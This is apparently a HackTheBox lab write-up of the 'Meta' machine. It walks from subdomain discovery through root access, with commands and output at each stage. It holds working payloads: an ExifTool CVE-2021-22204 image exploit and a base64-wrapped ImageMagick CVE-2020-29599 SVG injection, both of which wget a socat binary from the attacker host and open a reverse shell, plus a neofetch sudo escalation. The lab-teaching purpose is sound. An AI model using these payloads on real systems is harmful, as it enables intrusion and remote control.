# Meta

## Introduction

Welcome to my another writeup! In this HackTheBox [Meta](https://app.hackthebox.com/machines/Meta) machine, you'll learn: Enumerating subdomain, exploiting ExifTool's arbitrary code execution vulnerability (CVE-2021-22204), privilege escalation via exploiting ImageMagick command injection (CVE-2020-29599), misconfigurated Sudo permission, and more! Without further ado, let's dive in.

- Overall difficulty for me (From 1-10 stars): ★★★★☆☆☆☆☆☆

## Table of Content

1. **[Service Enumeration](#service-enumeration)**
2. **[Initial Foothold](#initial-foothold)**
3. **[Privilege Escalation: www-data to thomas](#privilege-escalation)**
4. **[Privilege Escalation: thomas to root](#thomas-to-root)**
5. **[Conclusion](#conclusion)**

## Background

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Meta/images/Meta.png)

## Service Enumeration

**Create 2 environment variables for future use:**
```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Meta)-[2023.08.16|14:48:34(HKT)]
└> export RHOSTS=10.10.11.140            
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Meta)-[2023.08.16|14:48:36(HKT)]
└> export LHOST=`ifconfig tun0 | grep -E 'inet [0-9]+\.[0-9]+\.[0-9]+\.[0-9]' | cut -d' ' -f10`
```

As usual, scan the machine for open ports via `rustscan` and `nmap`!

**Rustscan:**
```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Meta)-[2023.08.16|14:48:54(HKT)]
└> mkdir scanning; rustscan --ulimit 5000 -b 4500 -t 2000 --range 1-65535 $RHOSTS -- -sC -sV -oN scanning/rustscan.txt
[...]
Open 10.10.11.140:22
Open 10.10.11.140:80
[...]
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 12:81:17:5a:5a:c9:c6:00:db:f0:ed:93:64:fd:1e:08 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCiNHVBq9XNN5eXFkQosElagVm6qkXg6Iryueb1zAywZIA4b0dX+5xR5FpAxvYPxmthXA0E7/wunblfjPekyeKg+lvb+rEiyUJH25W/In13zRfJ6Su/kgxw9whZ1YUlzFTWDjUjQBij7QSMktOcQLi7zgrkG3cxGcS39SrEM8tvxcuSzMwzhFqVKFP/AM0jAxJ5HQVrkXkpGR07rgLyd+cNQKOGnFpAukUJnjdfv9PsV+LQs9p+a0jID+5B9y5fP4w9PvYZUkRGHcKCefYk/2UUVn0HesLNNrfo6iUxu+eeM9EGUtqQZ8nXI54nHOvzbc4aFbxADCfew/UJzQT7rovB
|   256 b5:e5:59:53:00:18:96:a6:f8:42:d8:c7:fb:13:20:49 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBEDINAHjreE4lgZywOGusB8uOKvVDmVkgznoDmUI7Rrnlmpy6DnOUhov0HfQVG6U6B4AxCGaGkKTbS0tFE8hYis=
|   256 05:e9:df:71:b5:9f:25:03:6b:d0:46:8d:05:45:44:20 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINdX83J9TLR63TPxQSvi3CuobX8uyKodvj26kl9jWUSq
80/tcp open  http    syn-ack Apache httpd
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache
|_http-title: Did not follow redirect to http://artcorp.htb
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

**`nmap` UDP port scan:**
```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Meta)-[2023.08.16|14:50:14(HKT)]
└> sudo nmap -sU $RHOSTS -oN scanning/nmap-udp-top1000.txt
[...]
Not shown: 1000 closed udp ports (port-unreach)
```

According to `rustscan` and `nmap` result, the target machine has 2 ports are opened:

|Open Port         | Service                       |
|:---:             |:---:                          |
|22/TCP            | OpenSSH 7.9p1 Debian          |
|80/TCP            | Apache httpd                  |

### HTTP on TCP port 80

**Adding a new host to `/etc/hosts`, which obtained from `nmap`'s script scan (`-sC`) result's `http-title`:**
```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Meta)-[2023.08.16|14:51:03(HKT)]
└> echo "$RHOSTS artcorp.htb" | sudo tee -a /etc/hosts
10.10.11.140 artcorp.htb
```

**Home page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Meta/images/Pasted%20image%2020230816145214.png)

In the home page, we can see there's a new product **"MetaView"** is already in testing phase...

**Found users in "Our Team" section:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Meta/images/Pasted%20image%2020230816145306.png)

Those users maybe useful for brute forcing in like SSH. Also, Thomas S. is a PHP developer, which means this website is written in PHP?

**We can also perform content discovery via tools like `gobuster` to discover hidden directories and files:**
```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Meta)-[2023.08.16|14:51:49(HKT)]
└> gobuster dir -u http://artcorp.htb/ -w /usr/share/seclists/Discovery/Web-Content/raft-large-files.txt -t 40 
[...]
/index.html           (Status: 200) [Size: 4427]
/.htaccess            (Status: 403) [Size: 199]
/.                    (Status: 200) [Size: 4427]
[...]
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Meta)-[2023.08.16|14:53:22(HKT)]
└> gobuster dir -u http://artcorp.htb/ -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -t 40
[...]
/assets               (Status: 301) [Size: 234] [--> http://artcorp.htb/assets/]
/css                  (Status: 301) [Size: 231] [--> http://artcorp.htb/css/]
[...]
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Meta)-[2023.08.16|14:55:42(HKT)]
└> gobuster dir -u http://artcorp.htb/ -w /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt -t 40 -x php,phpx,txt,bak
[...]
```

But nothing useful...

**We can also perform subdomain enumeration:**
```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Meta)-[2023.08.16|14:56:51(HKT)]
└> ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://artcorp.htb/ -H "Host: FUZZ.artcorp.htb" -fw 1 
[...]
[Status: 200, Size: 247, Words: 16, Lines: 10, Duration: 33ms]
    * FUZZ: dev01
```

- Found subdomain: **`dev01`**

**Add that subdomain to `/etc/hosts`:**
```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Meta)-[2023.08.16|14:57:40(HKT)]
└> sudo nano /etc/hosts
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Meta)-[2023.08.16|14:57:53(HKT)]
└> tail -n 1 /etc/hosts
10.10.11.140 artcorp.htb dev01.artcorp.htb
```

**`dev01.artcorp.htb` home page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Meta/images/Pasted%20image%2020230816145823.png)

**In the "MetaView" link, it's pointing to `/metaview/`:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Meta/images/Pasted%20image%2020230816145923.png)

**In here, we can upload images to display its metadata:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Meta/images/Pasted%20image%2020230816150036.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Meta/images/Pasted%20image%2020230816150042.png)

**We can also try to find the uploaded file via content discovery:**
```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Meta)-[2023.08.16|14:58:44(HKT)]
└> gobuster dir -u http://dev01.artcorp.htb/ -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -t 40
[...]
/server-status        (Status: 403) [Size: 199]
[...]
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Meta)-[2023.08.16|15:15:14(HKT)]
└> gobuster dir -u http://dev01.artcorp.htb/metaview/ -w /usr/share/wordlists/dirb/big.txt -t 40
[...]
/.htaccess            (Status: 403) [Size: 199]
/.htpasswd            (Status: 403) [Size: 199]
/assets               (Status: 301) [Size: 249] [--> http://dev01.artcorp.htb/metaview/assets/]
/css                  (Status: 301) [Size: 246] [--> http://dev01.artcorp.htb/metaview/css/]
/lib                  (Status: 301) [Size: 246] [--> http://dev01.artcorp.htb/metaview/lib/]
/uploads              (Status: 301) [Size: 250] [--> http://dev01.artcorp.htb/metaview/uploads/]
/vendor               (Status: 301) [Size: 249] [--> http://dev01.artcorp.htb/metaview/vendor/]
[...]
```

In here, we found `/uploads/` directory in `/metaview/`, but it just returns HTTP status "404 Not Found". So no index listing. I also tried to read the uploaded image, but no dice, maybe the filename is renamed.

## Initial Foothold

Whenever I deal with a file upload functionality, I always look for arbitrary file upload. In this case however, we couldn't find the uploaded image.

So, **maybe we can inject PHP code in the metadata's comment? Or OS command injection?**

Based on my experience, the web application is very likely **using `exiftool` to read the uploaded image's metadata**.

**Maybe, we could try to inject PHP code in the metadata's comment:**
```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Meta)-[2023.08.16|15:04:45(HKT)]
└> exiftool -Comment="<?php system('id'); ?>" ~/Downloads/rickroll.jpg
    1 image files updated
```

**Then upload it:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Meta/images/Pasted%20image%2020230816152320.png)

View source page:

```html
Comment                         : <?php system('id'); ?>
```

Nope... That doesn't work.

After Googling "file upload image exiftool metadata vulnerability", I found **this GitHub repository: [JPEG_RCE](https://github.com/OneSecCyber/JPEG_RCE).**

In this repository, it has a `evil.config` Exiftool configuration file, which exploits CVE-2021-22204.

> "ExifTool 7.44 to 12.23 has a bug in the DjVu module which allows for arbitrary code execution when parsing malicious images."

**Let's clone the repository and modify the image to our evil payload!**
```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Meta)-[2023.08.16|15:20:09(HKT)]
└> exiftool -config /opt/JPEG_RCE/eval.config ~/Downloads/rickroll.jpg -eval='system("id")'    
    1 image files updated
```

**Upload it again:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Meta/images/Pasted%20image%2020230816152604.png)

**It worked! Let's get a reverse shell!**

- Hosting `socat` binary via Python `http.server` module: (Using `socat` for fully interactive shell)

```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Meta)-[2023.08.16|15:27:45(HKT)]
└> file /opt/static-binaries/binaries/linux/x86_64/socat 
/opt/static-binaries/binaries/linux/x86_64/socat: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, stripped
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Meta)-[2023.08.16|15:27:54(HKT)]
└> python3 -m http.server -d /opt/static-binaries/binaries/linux/x86_64 80 
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

- Modify the image with a reverse shell payload: (Generated from [revshells.com](https://www.revshells.com/))

```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Meta)-[2023.08.16|15:29:53(HKT)]
└> exiftool -config /opt/JPEG_RCE/eval.config ~/Downloads/rickroll.jpg -eval='system("wget http://10.10.14.19/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat TCP:10.10.14.19:443 EXEC:\"/bin/bash\",pty,stderr,setsid,sigint,sane")'
    1 image files updated
```

- Setup a socat TTY listener:

```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Meta)-[2023.08.16|15:28:57(HKT)]
└> socat -d -d file:`tty`,raw,echo=0 TCP-LISTEN:443
2023/08/16 15:28:57 socat[108575] N opening character device "/dev/pts/3" for reading and writing
2023/08/16 15:28:57 socat[108575] N listening on AF=2 0.0.0.0:443
```

- Upload the modified image:

```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Meta)-[2023.08.16|15:28:57(HKT)]
└> socat -d -d file:`tty`,raw,echo=0 TCP-LISTEN:443
2023/08/16 15:28:57 socat[108575] N opening character device "/dev/pts/3" for reading and writing
2023/08/16 15:28:57 socat[108575] N listening on AF=2 0.0.0.0:443
                                                                 2023/08/16 15:30:29 socat[108575] N accepting connection from AF=2 10.10.11.140:34368 on AF=2 10.10.14.19:443
                                                                   2023/08/16 15:30:29 socat[108575] N starting data transfer loop with FDs [5,5] and [7,7]
                                                www-data@meta:/var/www/dev01.artcorp.htb/metaview$ 
www-data@meta:/var/www/dev01.artcorp.htb/metaview$ export TERM=xterm-256color
www-data@meta:/var/www/dev01.artcorp.htb/metaview$ stty rows 22 columns 107
www-data@meta:/var/www/dev01.artcorp.htb/metaview$ ^C
www-data@meta:/var/www/dev01.artcorp.htb/metaview$ whoami; hostname; ip a
www-data
meta
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:50:56:b9:2f:79 brd ff:ff:ff:ff:ff:ff
    inet 10.10.11.140/23 brd 10.10.11.255 scope global eth0
       valid_lft forever preferred_lft forever
```

I'm user `www-data`!

## Privilege Escalation

### www-data to thomas

After gaining initial foothold on a target machine, we need to escalate our privilege. To do so, we need to enumerate the system.

**Find system users:**
```shell
www-data@meta:/var/www/dev01.artcorp.htb/metaview$ awk -F':' '{ if ($3 >= 1000 && $3 <= 60000) { print $1 } }' /etc/passwd
thomas
www-data@meta:/var/www/dev01.artcorp.htb/metaview$ ls -lah /home
total 12K
drwxr-xr-x  3 root   root   4.0K Aug 29  2021 .
drwxr-xr-x 18 root   root   4.0K Aug 29  2021 ..
drwxr-xr-x  4 thomas thomas 4.0K Jan 17  2022 thomas
```

- System user: `thomas`

**SUID binaries:**
```shell
www-data@meta:/var/www/dev01.artcorp.htb/metaview$ find / -perm -4000 2>/dev/null
/usr/bin/umount
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/su
/usr/bin/fusermount
/usr/bin/mount
/usr/bin/chfn
/usr/bin/sudo
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
```

All default SUID binaries...

**Listening ports:**
```shell
www-data@meta:/var/www/dev01.artcorp.htb/metaview$ netstat -tunlp
[...]
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
```

Only has port 22 and 80 opened, which is already discovered in Rustscan.

**Found `convert_images` directory in `/var/www/dev01.artcorp.htb/`:**
```shell
www-data@meta:/var/www/dev01.artcorp.htb/metaview$ ls -lah /var/www/dev01.artcorp.htb/
total 20K
drwxr-xr-x 4 root root     4.0K Oct 18  2021 .
drwxr-xr-x 5 root root     4.0K Aug 29  2021 ..
drwxrwxr-x 2 root www-data 4.0K Jan  4  2022 convert_images
-rw-r--r-- 1 root www-data  247 Oct 18  2021 index.php
drwxr-xr-x 7 root www-data 4.0K Aug 28  2021 metaview
www-data@meta:/var/www/dev01.artcorp.htb/metaview$ ls -lah /var/www/dev01.artcorp.htb/convert_images/
total 8.0K
drwxrwxr-x 2 root www-data 4.0K Jan  4  2022 .
drwxr-xr-x 4 root root     4.0K Oct 18  2021 ..
```

**And a Bash script in `/usr/local/bin/`:**
```shell
www-data@meta:/var/www/dev01.artcorp.htb/metaview$ ls -lah /usr/local/bin/convert_images.sh
-rwxr-xr-x 1 root root 126 Jan  3  2022 /usr/local/bin/convert_images.sh
```

**`/usr/local/bin/convert_images.sh`:**
```bash
#!/bin/bash
cd /var/www/dev01.artcorp.htb/convert_images/ && /usr/local/bin/mogrify -format png *.* 2>/dev/null
pkill mogrify
```

**Monitoring processes via `pspy`:** 
```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Meta)-[2023.08.16|15:48:28(HKT)]
└> file /opt/pspy/pspy64 
/opt/pspy/pspy64: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, Go BuildID=eLPXwvfdDroLoCiGThdy/ADWkD7F3M81WNJfXu4Bf/E1SsFRH7R_QKLzCzaJmU/fDV0SVhtETqaDiVRM5z9, stripped
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Meta)-[2023.08.16|15:48:35(HKT)]
└> python3 -m http.server -d /opt/pspy 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

```shell
www-data@meta:/var/www/dev01.artcorp.htb/metaview$ wget http://10.10.14.19/pspy64 -O /tmp/pspy; chmod +x /tmp/pspy; /tmp/pspy
[...]
2023/08/16 03:50:01 CMD: UID=0    PID=14519  | /usr/sbin/CRON -f 
2023/08/16 03:50:01 CMD: UID=1000 PID=14518  | /bin/sh -c /usr/local/bin/convert_images.sh 
2023/08/16 03:50:01 CMD: UID=1000 PID=14521  | /bin/sh -c /usr/local/bin/convert_images.sh 
2023/08/16 03:50:01 CMD: UID=1000 PID=14523  | /usr/local/bin/mogrify -format png *.* 
2023/08/16 03:50:01 CMD: UID=1000 PID=14524  | pkill mogrify 
[...]
2023/08/16 03:51:01 CMD: UID=0    PID=14532  | /usr/sbin/CRON -f 
2023/08/16 03:51:01 CMD: UID=1000 PID=14533  | /bin/sh -c /usr/local/bin/convert_images.sh 
2023/08/16 03:51:01 CMD: UID=0    PID=14535  | /bin/sh -c rm /tmp/* 
2023/08/16 03:51:01 CMD: UID=1000 PID=14536  | /usr/local/bin/mogrify -format png *.* 
2023/08/16 03:51:01 CMD: UID=0    PID=14537  | /bin/sh -c rm /var/www/dev01.artcorp.htb/metaview/uploads/* 
2023/08/16 03:51:01 CMD: UID=1000 PID=14538  | pkill mogrify 
```

Looks like every minute, there's a cronjob is being ran.

**That cronjob will run as user `thomas` (UID 1000) and execute `/usr/local/bin/convert_images.sh` Bash script.**

Hmm... What's that `/usr/local/bin/convert_images.sh` Bash script do...

After searching for `mogrify`, I found [this page from ImageMagick](https://imagemagick.org/script/mogrify.php).

> Use the magick mogrify program to resize an image, blur, crop, despeckle, dither, draw on, flip, join, re-sample, and much more. This tool is similar to [magick](https://imagemagick.org/script/convert.php) except that the original image file is _overwritten_ (unless you change the file suffix with the [`-format`](https://imagemagick.org/script/command-line-options.php#format) option) with any changes you request. See [Command Line Processing](https://imagemagick.org/script/command-line-processing.php) for advice on how to structure your mogrify command or see below for sample usages of the command. (From [https://imagemagick.org/script/mogrify.php](https://imagemagick.org/script/mogrify.php))

**TLDR: `mogrify` is to resize an image, change image's format and more.**

So, in the `/usr/local/bin/convert_images.sh` Bash script, it's finding all files in `/var/www/dev01.artcorp.htb/convert_images/` directory, and format those files to PNG format.

Hmm... I wonder if `mogrify` has any vulnerability...

**We can find its version via:**
```shell
www-data@meta:/var/www/dev01.artcorp.htb/metaview$ mogrify -version
Version: ImageMagick 7.0.10-36 Q16 x86_64 2021-08-29 https://imagemagick.org
[...]
```

- ImageMagick version: `7.0.10-36`

**Upon researching, I found [this website](https://www.infosecmatter.com/nessus-plugin-library/?id=145561), which talks about ImageMagick command injection (CVE-2020-29599).**

> ImageMagick before 6.9.11-40 and 7.x before 7.0.10-40 mishandles the `-authenticate` option, which allows setting a password for password-protected PDF files. The user-controlled password was not properly escaped/sanitized and it was therefore possible to inject additional shell commands via `coders/pdf.c`. (From [https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-29599](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-29599))

**In the "Public Exploits" section, there's [a GitHub repository](https://github.com/barrracud4/image-upload-exploits):**

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Meta/images/Pasted%20image%2020230816163635.png)

**In `SVG/Shell_Injection_CVE-2020-29599`, we can find some payloads:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Meta/images/Pasted%20image%2020230816163728.png)

**`cve-2020-29599-nslookup-dnsbased.svg`:**
```xml
<image authenticate='ff" `nslookup $(whoami).pdf-shell-inj-cve-2020-29599.TARGET_DOMAIN`;"'>
  <read filename="pdf:/etc/passwd"/>
  <get width="base-width" height="base-height" />
  <resize geometry="400x400" />
  <write filename="test.png" />
  <svg width="700" height="700" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">       
  <image xlink:href="msl:poc.svg" height="100" width="100"/>
  </svg>
</image>
```

This SVG payload leverages one of the out-of-band exfiltration technique, DNS exfiltration, via exploiting the `-authenticate` option.

- Create a `poc.svg` SVG payload, and modify the command to a reverse shell payload:

```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Meta)-[2023.08.16|17:23:03(HKT)]
└> echo -n "wget http://10.10.14.19/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat TCP:10.10.14.19:53 EXEC:'/bin/bash',pty,stderr,setsid,sigint,sane" | base64 -w0
d2dldCBodHRwOi8vMTAuMTAuMTQuMTkvc29jYXQgLU8gL3RtcC9zb2NhdDsgY2htb2QgK3ggL3RtcC9zb2NhdDsgL3RtcC9zb2NhdCBUQ1A6MTAuMTAuMTQuMTk6NTMgRVhFQzonL2Jpbi9iYXNoJyxwdHksc3RkZXJyLHNldHNpZCxzaWdpbnQsc2FuZQ==
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Meta)-[2023.08.16|17:23:23(HKT)]
└> python3 -m http.server -d /opt/static-binaries/binaries/linux/x86_64 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

```xml
<image authenticate='ff" `echo "d2dldCBodHRwOi8vMTAuMTAuMTQuMTkvc29jYXQgLU8gL3RtcC9zb2NhdDsgY2htb2QgK3ggL3RtcC9zb2NhdDsgL3RtcC9zb2NhdCBUQ1A6MTAuMTAuMTQuMTk6NTMgRVhFQzonL2Jpbi9iYXNoJyxwdHksc3RkZXJyLHNldHNpZCxzaWdpbnQsc2FuZQ==" | base64 -d | /bin/bash`;"'>
  <read filename="pdf:/etc/passwd"/>
  <get width="base-width" height="base-height" />
  <resize geometry="400x400" />
  <write filename="test.png" />
  <svg width="700" height="700" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">       
  <image xlink:href="msl:poc.svg" height="100" width="100"/>
  </svg>
</image>
```

```shell
www-data@meta:/var/www/dev01.artcorp.htb/metaview$ nano /dev/shm/poc.svg
www-data@meta:/var/www/dev01.artcorp.htb/metaview$ cp /dev/shm/poc.svg /var/www/dev01.artcorp.htb/convert_images/
```

- Setup a socat TTY listener:

```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Meta)-[2023.08.16|17:22:00(HKT)]
└> socat -d -d file:`tty`,raw,echo=0 TCP-LISTEN:53
2023/08/16 17:22:10 socat[206953] N opening character device "/dev/pts/1" for reading and writing
2023/08/16 17:22:10 socat[206953] N listening on AF=2 0.0.0.0:53
```

- Wait for a minute for the cronjob run:

```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Meta)-[2023.08.16|17:22:00(HKT)]
└> socat -d -d file:`tty`,raw,echo=0 TCP-LISTEN:53
2023/08/16 17:22:10 socat[206953] N opening character device "/dev/pts/1" for reading and writing
2023/08/16 17:22:10 socat[206953] N listening on AF=2 0.0.0.0:53
                                                                2023/08/16 17:25:02 socat[206953] N accepting connection from AF=2 10.10.11.140:45882 on AF=2 10.10.14.19:53
                                                                 2023/08/16 17:25:02 socat[206953] N starting data transfer loop with FDs [5,5] and [7,7]
                                              thomas@meta:/var/www/dev01.artcorp.htb/convert_images$ 
thomas@meta:/var/www/dev01.artcorp.htb/convert_images$ export TERM=xterm-256color                      
thomas@meta:/var/www/dev01.artcorp.htb/convert_images$ stty rows 22 columns 107
thomas@meta:/var/www/dev01.artcorp.htb/convert_images$ ^C
thomas@meta:/var/www/dev01.artcorp.htb/convert_images$ whoami; hostname; id; ip a
thomas
meta
uid=1000(thomas) gid=1000(thomas) groups=1000(thomas)
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:50:56:b9:2f:79 brd ff:ff:ff:ff:ff:ff
    inet 10.10.11.140/23 brd 10.10.11.255 scope global eth0
       valid_lft forever preferred_lft forever
```

Now I'm user `thomas`!

**user.txt:**
```shell
thomas@meta:~$ cat user.txt 
{Redacted}
```

### thomas to root

**Sudo permission:**
```shell
thomas@meta:~$ sudo -l
Matching Defaults entries for thomas on meta:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    env_keep+=XDG_CONFIG_HOME

User thomas may run the following commands on meta:
    (root) NOPASSWD: /usr/bin/neofetch \"\"
```

In here, we see that our **user `thomas` can run `/usr/bin/neofetch` as `root` without password!**

```shell
thomas@meta:~$ sudo /usr/bin/neofetch
       _,met$$$$$gg.          root@meta 
    ,g$$$$$$$$$$$$$$$P.       --------- 
  ,g$$P"     """Y$$.".        OS: Debian GNU/Linux 10 (buster) x86_64 
 ,$$P'              `$$$.     Host: VMware Virtual Platform None 
',$$P       ,ggs.     `$$b:   Kernel: 4.19.0-17-amd64 
`d$$'     ,$P"'   .    $$$    Uptime: 2 hours, 42 mins 
 $$P      d$'     ,    $$P    Packages: 495 (dpkg) 
 $$:      $$.   -    ,d$$'    Shell: bash 5.0.3 
 $$;      Y$b._   _,d$P'      Terminal: socat 
 Y$$.    `.`"Y$$$$P"'         CPU: AMD EPYC 7302P 16- (2) @ 2.994GHz 
 `$$b      "-.__              GPU: VMware SVGA II Adapter 
  `Y$$                        Memory: 153MiB / 1994MiB 
   `Y$$.
     `$$b.                                            
       `Y$$b.
          `"Y$b._
              `"""
```

However, we can't provide any arguments, because the command is only restricted to `/usr/bin/neofetch ""`.

**By taking a closer look at the Sudo permission, I noticed one thing stands out:**
```shell
thomas@meta:~$ sudo -l
Matching Defaults entries for thomas on meta:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    env_keep+=XDG_CONFIG_HOME
[...]
```

What's that **`env_keep+=XDG_CONFIG_HOME`**??

When the Sudo command is being ran, **it'll keep the environment variable `XDG_CONFIG_HOME` to the Sudo command**!

And what's that environment variable `XDG_CONFIG_HOME`?

> There is a single base directory relative to which user-specific configuration files should be written. This directory is defined by the environment variable `$XDG_CONFIG_HOME`. (From [https://specifications.freedesktop.org/basedir-spec/basedir-spec-latest.html](https://specifications.freedesktop.org/basedir-spec/basedir-spec-latest.html))

**In `thomas`'s home directory, we found the `.config` directory:**
```shell
thomas@meta:~$ ls -lah
total 36K
drwxr-xr-x 5 thomas thomas 4.0K Aug 16 05:35 .
drwxr-xr-x 3 root   root   4.0K Aug 29  2021 ..
lrwxrwxrwx 1 root   root      9 Aug 29  2021 .bash_history -> /dev/null
-rw-r--r-- 1 thomas thomas  220 Aug 29  2021 .bash_logout
-rw-r--r-- 1 thomas thomas 3.5K Aug 29  2021 .bashrc
drwxr-xr-x 3 thomas thomas 4.0K Aug 30  2021 .config
drwxr-xr-x 3 thomas thomas 4.0K Aug 16 05:35 .local
-rw-r--r-- 1 thomas thomas  807 Aug 29  2021 .profile
drwx------ 2 thomas thomas 4.0K Jan  4  2022 .ssh
-rw-r----- 1 root   thomas   33 Aug 16 02:49 user.txt
```

**Inside there, there's a neofetch's configuration file:**
```shell
thomas@meta:~$ ls -lah .config/neofetch/
total 24K
drwxr-xr-x 2 thomas thomas 4.0K Aug 16 05:36 .
drwxr-xr-x 3 thomas thomas 4.0K Aug 30  2021 ..
-rw-r--r-- 1 thomas thomas  15K Aug 30  2021 config.conf
```

**Then, according to [GTFOBins](https://gtfobins.github.io/gtfobins/neofetch/#sudo), we can escalate our privilege escalation using the `--config` option:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Meta/images/Pasted%20image%2020230816175031.png)

Hmm... **Maybe we can export the `XDG_CONFIG_HOME` environment varible, and execute any commands as root via our evil neofecth's configuration file??**

- Export `XDG_CONFIG_HOME` environment varible:

```shell
thomas@meta:~$ export XDG_CONFIG_HOME="$HOME/.config"
```

- Overwrite the original configuration file:

```shell
thomas@meta:~$ echo 'exec /bin/bash' > .config/neofetch/config.conf 
```

This will spawn a new Bash shell.

- Finally run `neofetch` as `root` with Sudo:

```shell
thomas@meta:~$ sudo /usr/bin/neofetch 
root@meta:/home/thomas# whoami; hostname; id; ip a
root
meta
uid=0(root) gid=0(root) groups=0(root)
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:50:56:b9:2f:79 brd ff:ff:ff:ff:ff:ff
    inet 10.10.11.140/23 brd 10.10.11.255 scope global eth0
       valid_lft forever preferred_lft forever
```

I'm root now! :D

## Rooted

**root.txt:**
```shell
root@meta:~# cat root.txt 
{Redacted}
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Meta/images/Pasted%20image%2020230816175404.png)

## Conclusion

What we've learned:

1. Enumerating subdomain
2. Exploiting ExifTool's arbitrary code execution vulnerability (CVE-2021-22204)
3. Horizontal privilege escalation via exploiting ImageMagick command injection (CVE-2020-29599)
